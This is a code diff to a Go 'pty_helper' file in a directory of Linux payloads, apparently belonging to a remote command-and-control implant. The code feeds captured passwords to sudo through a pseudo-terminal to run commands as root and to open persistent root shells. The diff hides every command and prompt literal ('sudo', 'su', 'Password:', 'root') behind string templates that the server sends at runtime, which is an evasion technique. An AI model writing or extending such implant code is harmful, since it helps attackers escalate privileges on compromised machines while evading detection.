@@ -1,4 +1,4 @@
-// server/docker/payloads/Linux/pty_helper.go
+// server/docker/payloads/TCP_Linux/pty_helper.go
 
 //go:build linux
 // +build linux
@@ -20,6 +20,48 @@ import (
 	"github.com/creack/pty"
 )
 
+// Template indices for PTY strings (must match server's common.go)
+const (
+	idxPtySudo      = 690
+	idxPtySu        = 691
+	idxPtySh        = 692
+	idxPtyFlagS     = 693
+	idxPtyFlagP     = 694
+	idxPtyFlagC     = 695
+	idxPtyFlagDash  = 696
+	idxPtyPassword  = 697
+	idxPtyPasswordL = 698
+	idxPtySorry     = 699
+	idxPtyTryAgain  = 700
+	idxPtyIncorrect = 701
+	idxPtyExit      = 702
+	idxPtyRoot      = 703
+)
+
+// ptyTemplate stores the template received from the server (via shell command)
+var ptyTemplate []string
+var ptyTemplateMu sync.RWMutex
+
+// SetPtyTemplate stores the template for pty_helper.go to use
+func SetPtyTemplate(templates []string) {
+	ptyTemplateMu.Lock()
+	defer ptyTemplateMu.Unlock()
+	ptyTemplate = templates
+}
+
+// ptyTpl retrieves a template string by index
+func ptyTpl(idx int) string {
+	ptyTemplateMu.RLock()
+	tpl := ptyTemplate
+	ptyTemplateMu.RUnlock()
+
+	if tpl != nil && idx < len(tpl) && tpl[idx] != "" {
+		return tpl[idx]
+	}
+	// Fallback to empty string (caller should handle)
+	return ""
+}
+
 // PTYHelper provides common PTY functionality for fallback
 type PTYHelper struct {
 	timeout time.Duration
@@ -31,7 +73,7 @@ func (p *PTYHelper) ExecuteWithSudo(password, command, workingDir string) (strin
 	defer cancel()
 
 	// Prepare sudo command
-	cmd := exec.CommandContext(ctx, "sudo", "-S", "-p", "Password:", "sh", "-c", command)
+	cmd := exec.CommandContext(ctx, ptyTpl(idxPtySudo), ptyTpl(idxPtyFlagS), ptyTpl(idxPtyFlagP), ptyTpl(idxPtyPassword), ptyTpl(idxPtySh), ptyTpl(idxPtyFlagC), command)
 	cmd.Dir = workingDir
 
 	// Start with PTY
@@ -62,7 +104,7 @@ func (p *PTYHelper) ExecuteWithSudo(password, command, workingDir string) (strin
 			output := string(buf[:n])
 
 			// Check for password prompt
-			if !passwordSent && strings.Contains(output, "Password:") {
+			if !passwordSent && strings.Contains(output, ptyTpl(idxPtyPassword)) {
 				_, err := ptmx.Write([]byte(password + "\n"))
 				if err != nil {
 					errorChan <- fmt.Errorf(ErrCtx(E11, err.Error()))
@@ -73,14 +115,14 @@ func (p *PTYHelper) ExecuteWithSudo(password, command, workingDir string) (strin
 			}
 
 			// Check for wrong password
-			if strings.Contains(output, "Sorry, try again") ||
-				strings.Contains(output, "incorrect password") {
+			if strings.Contains(output, ptyTpl(idxPtySorry)) && strings.Contains(output, ptyTpl(idxPtyTryAgain)) ||
+				strings.Contains(output, ptyTpl(idxPtyIncorrect)) {
 				errorChan <- fmt.Errorf(Err(E3))
 				return
 			}
 
 			// Add to output buffer (skip password prompts)
-			if !strings.Contains(output, "Password:") {
+			if !strings.Contains(output, ptyTpl(idxPtyPassword)) {
 				outputBuffer.Write(buf[:n])
 			}
 		}
@@ -137,10 +179,10 @@ type SudoSession struct {
 // StartSudoSessionAsUser creates a new sudo session
 func StartSudoSessionAsUser(password, targetUser, workingDir string) (*SudoSession, error) {
 	var cmd *exec.Cmd
-	if targetUser == "root" || targetUser == "" {
-		cmd = exec.Command("sudo", "-S", "su", "-")
+	if targetUser == ptyTpl(idxPtyRoot) || targetUser == "" {
+		cmd = exec.Command(ptyTpl(idxPtySudo), ptyTpl(idxPtyFlagS), ptyTpl(idxPtySu), ptyTpl(idxPtyFlagDash))
 	} else {
-		cmd = exec.Command("sudo", "-S", "su", "-", targetUser)
+		cmd = exec.Command(ptyTpl(idxPtySudo), ptyTpl(idxPtyFlagS), ptyTpl(idxPtySu), ptyTpl(idxPtyFlagDash), targetUser)
 	}
 
 	if workingDir != "" {
@@ -185,7 +227,7 @@ func StartSudoSessionAsUser(password, targetUser, workingDir string) (*SudoSessi
 		output := string(buf[:n])
 
 		// Send password if prompted
-		if strings.Contains(output, "Password:") || strings.Contains(output, "password") {
+		if strings.Contains(output, ptyTpl(idxPtyPassword)) || strings.Contains(output, ptyTpl(idxPtyPasswordL)) {
 			_, err = ptmx.Write([]byte(password + "\n"))
 			if err != nil {
 				authDone <- fmt.Errorf(ErrCtx(E11, err.Error()))
@@ -200,7 +242,7 @@ func StartSudoSessionAsUser(password, targetUser, workingDir string) (*SudoSessi
 
 			if n > 0 {
 				authResult := string(buf[:n])
-				if strings.Contains(authResult, "Sorry") || strings.Contains(authResult, "incorrect") {
+				if strings.Contains(authResult, ptyTpl(idxPtySorry)) || strings.Contains(authResult, ptyTpl(idxPtyIncorrect)) {
 					authDone <- fmt.Errorf(Err(E3))
 					return
 				}
@@ -226,7 +268,7 @@ func StartSudoSessionAsUser(password, targetUser, workingDir string) (*SudoSessi
 
 // StartSudoSession creates a new sudo session (defaults to root)
 func StartSudoSession(password, workingDir string) (*SudoSession, error) {
-	return StartSudoSessionAsUser(password, "root", workingDir)
+	return StartSudoSessionAsUser(password, ptyTpl(idxPtyRoot), workingDir)
 }
 
 // EnableStatefulMode tries to set up the session for stateful execution
@@ -378,7 +420,7 @@ func (s *SudoSession) Close() error {
 
 	// Send exit command
 	if s.pty != nil {
-		s.pty.Write([]byte("exit\n"))
+		s.pty.Write([]byte(ptyTpl(idxPtyExit) + "\n"))
 		time.Sleep(100 * time.Millisecond)
 		s.pty.Close()
 	}
@@ -407,7 +449,7 @@ func (s *SudoSession) GetInfo() string {
 	uptime := time.Since(s.createdAt)
 	user := s.targetUser
 	if user == "" {
-		user = "root"
+		user = ptyTpl(idxPtyRoot)
 	}
 
 	pid := 0
